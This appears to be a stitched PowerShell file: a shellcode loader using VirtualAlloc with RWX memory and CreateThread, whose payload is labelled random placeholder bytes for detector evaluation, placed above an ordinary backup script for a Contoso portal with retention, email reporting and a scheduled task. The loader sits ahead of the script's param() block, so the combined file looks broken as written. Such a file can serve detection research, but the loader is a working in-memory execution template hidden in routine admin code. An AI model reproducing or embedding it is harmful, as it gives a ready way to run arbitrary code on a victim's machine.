
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xc5, 0x20, 0xcb, 0xf2, 0xb1, 0x4e, 0x56, 0x99, 0x3a, 0xf0, 0x5f, 0xcf, 0x6a, 0x14, 0xa4, 0xdd,
        0x6e, 0x96, 0xbe, 0x8e, 0x8d, 0x1a, 0x2c, 0xfa, 0x2a, 0x5c, 0xb5, 0xfd, 0x9b, 0x89, 0x87, 0xb1,
        0xd1, 0x1e, 0xca, 0xa3, 0xb1, 0x22, 0xab, 0xfc, 0x20, 0xdb, 0xe0, 0x97, 0x08, 0x67, 0x4e, 0x58,
        0x7c, 0xa8, 0xed, 0x07, 0xb1, 0xb5, 0x05, 0xb5, 0x02, 0x50, 0x79, 0x66, 0x49, 0xaf, 0x73, 0x58,
        0x9e, 0x06, 0x51, 0xf0, 0x35, 0xb0, 0xd9, 0x5e, 0x3b, 0x0f, 0xa7, 0x4c, 0xb0, 0x2b, 0xe9, 0x21,
        0x4b, 0xb2, 0x4b, 0x80, 0xb9, 0x1d, 0x8b, 0xa3, 0xf6, 0xac, 0x58, 0xe1, 0x86, 0xc5, 0xa2, 0x48,
        0xa8, 0xaa, 0xb1, 0x88, 0xb4, 0x58, 0xcd, 0xfb, 0x34, 0x7c, 0x96, 0x6d, 0xa3, 0xd7, 0x67, 0x60,
        0x80, 0xde, 0x83, 0x73, 0xda, 0xf7, 0xb8, 0xb4, 0x01, 0xa0, 0x16, 0xfb, 0xb6, 0x96, 0xb6, 0xf2,
        0x9b, 0xf6, 0x2d, 0x62, 0x20, 0x35, 0x4c, 0xc5, 0x04, 0x12, 0x43, 0x8c, 0x82, 0xb2, 0xcb, 0xed,
        0x39, 0x02, 0xe2, 0x48, 0xa5, 0x83, 0x54, 0x40, 0x08, 0xf9, 0xd9, 0x11, 0x66, 0x41, 0x78, 0xae,
        0x0b, 0x8d, 0x1d, 0x1a, 0xc3, 0xaa, 0x5b, 0xa0, 0xfa, 0x95, 0x4d, 0xef, 0x15, 0x1e, 0x26, 0xad,
        0x01, 0x90, 0x76, 0xbe, 0x27, 0xab, 0x20, 0x49, 0x2d, 0x60, 0x5b, 0x88, 0xbd, 0xec, 0xb5, 0xb7,
        0xda, 0x7c, 0xb9, 0x25, 0x11, 0x4a, 0x86, 0x1f, 0x31, 0xab, 0x94, 0x64, 0xfd, 0xf3, 0xe5, 0xc8,
        0xf2, 0x0a, 0x70, 0xef, 0xc2, 0x14, 0xee, 0xdf, 0xbf, 0x5a, 0x4d, 0xa6, 0x58, 0x49, 0xce, 0x97,
        0x66, 0x25, 0x9a, 0x95, 0x47, 0x6d, 0xb0, 0x66, 0xa4, 0x7c, 0xec, 0x60, 0x89, 0x97, 0x05, 0xda,
        0x72, 0x25, 0xb2, 0xfc, 0x6c, 0x54, 0x10, 0x4e, 0xeb, 0x69, 0x4f, 0x49, 0xca, 0x59, 0x9d, 0x8c,
        0x60, 0x59, 0xb6, 0x1c, 0x6e, 0x8c, 0x0c, 0x20, 0x8d, 0x2b, 0xd9, 0xfb, 0x86, 0x86, 0x9e, 0xad,
        0xc0, 0x7c, 0x86, 0xca, 0xce, 0x59, 0x87, 0x94, 0x54, 0xe0, 0x5e, 0x8f, 0x0d, 0x95, 0xd8, 0xd4,
        0x5f, 0xda, 0xb6, 0x0e, 0x27, 0x96, 0xe8, 0x40, 0xd9, 0x7f, 0x3c, 0x59, 0xa3, 0xb0, 0x07, 0xda,
        0x54, 0x0e, 0xae, 0x72, 0x9f, 0x80, 0x71, 0xa6, 0xa9, 0x12, 0x23, 0x34, 0x06, 0xd2, 0x85, 0x18,
        0x55, 0x98, 0x2c, 0xfa, 0x80, 0x03, 0xf4, 0x70, 0x66, 0x84, 0xe0, 0x7a, 0xc0, 0x54, 0x37, 0xaa,
        0x72, 0xfc, 0x1a, 0x10, 0xd4, 0x0b, 0xf9, 0xee, 0x7c, 0x79, 0xc8, 0xfe, 0xb0, 0xbe, 0x2c, 0x15,
        0xc9, 0x1e, 0xd7, 0x66, 0xf2, 0x37, 0xdc, 0x76, 0x6d, 0x3c, 0x86, 0xd2, 0x0d, 0x59, 0x2d, 0x14,
        0x47, 0x69, 0x70, 0xe6, 0x84, 0x0a, 0x41, 0xf8, 0x90, 0x0c, 0xdb, 0x99, 0x8c, 0x38, 0x68, 0xac,
        0x50, 0xcf, 0x6d, 0xe4, 0x89, 0xa8, 0x42, 0x33, 0x80, 0xe0, 0x73, 0xdc, 0xcb, 0x8c, 0x03, 0xb4,
        0x8f, 0xcd, 0x85, 0x8f, 0x27, 0x48, 0xa7, 0xf0, 0xc7, 0x36, 0x5c, 0xc1, 0x49, 0x50, 0x10, 0xbb,
        0x46, 0x85, 0x99, 0xd0, 0x7e, 0x4d, 0x86, 0x51, 0x47, 0xe2, 0xda, 0xcb, 0x4c, 0x05, 0x17, 0x77,
        0x48, 0xb6, 0xfc, 0x6a, 0x51, 0xde, 0x24, 0x09, 0xe3, 0xbb, 0xe4, 0x70, 0xb3, 0xda, 0xfa, 0x48,
        0x41, 0x24, 0x5c, 0x5c, 0x40, 0x69, 0xc7, 0xdb, 0xa5, 0xb8, 0x59, 0x6d, 0x26, 0x50, 0x67, 0x86,
        0x70, 0xe8, 0x32, 0xec, 0xf9, 0x72, 0x22, 0xa1, 0x4f, 0xb0, 0x08, 0xcb, 0xe8, 0x08, 0x11, 0x93,
        0xbd, 0x98, 0x83, 0x3c, 0x02, 0x9c, 0x65, 0x40, 0xc7, 0xfb, 0x41, 0x38, 0xc6, 0x56, 0x2e, 0xe8,
        0xba, 0x51, 0x25, 0xb4, 0x62, 0x2a, 0x15, 0x54, 0x49, 0x15, 0xb0, 0xf7, 0xc5, 0x27, 0xea, 0xc5,
        0xff, 0xd5, 0x64, 0x06, 0x4f, 0xab, 0xb5, 0x9e, 0xbb, 0x7d, 0x72, 0xd1, 0xee, 0xb1, 0x4a, 0x59,
        0x20, 0xfc, 0x6f, 0x34, 0x3f, 0x57, 0x1d, 0x43, 0x0f, 0x44, 0x24, 0x28, 0x55, 0xb6, 0x9f, 0x51,
        0xf6, 0xd2, 0x6f, 0xda, 0xfc, 0x8e, 0xbd, 0xce, 0x96, 0x44, 0x1c, 0x38, 0x28, 0xfc, 0x9c, 0x2e,
        0x72, 0x4c, 0x2a, 0x32, 0x76, 0x30, 0x0f, 0x8e, 0x3a, 0xa6, 0x2c, 0x71, 0x53, 0x30, 0x34, 0xd2,
        0xae, 0x79, 0xbd, 0x07, 0x31, 0x9b, 0x03, 0x7e, 0x2d, 0x51, 0x8f, 0xf9, 0x21, 0x59, 0x7a, 0x26,
        0x3c, 0x03, 0xac, 0x68, 0x5d, 0x4a, 0xc1, 0xe4, 0xc4, 0xce, 0x28, 0xf1, 0xaa, 0x47, 0x7b, 0x9b,
        0x7e, 0x5b
    )

    $BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 4443)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
[CmdletBinding()]
param(
    [string]$SourcePath = 'C:\Apps\Contoso.Portal',
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = "E:\Backups\Portal",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 7,

    [ValidateSet("Optimal", "Fastest", "NoCompression")]
    [string]$CompressionLevel = 'Fastest',
    [int]$MinFreeGB = 50,

    [switch]$DryRun
)
$ProgressPreference = 'SilentlyContinue'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 4 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8

$style = @'
<style>
body { font-family: Arial; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = "backup-ops@internal.corp"
$MailFrom = "backup@internal.corp"
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Backup completed'
    Body       = $mailBody
    SmtpServer = "smtp.internal.corp"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At "03:45"
Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
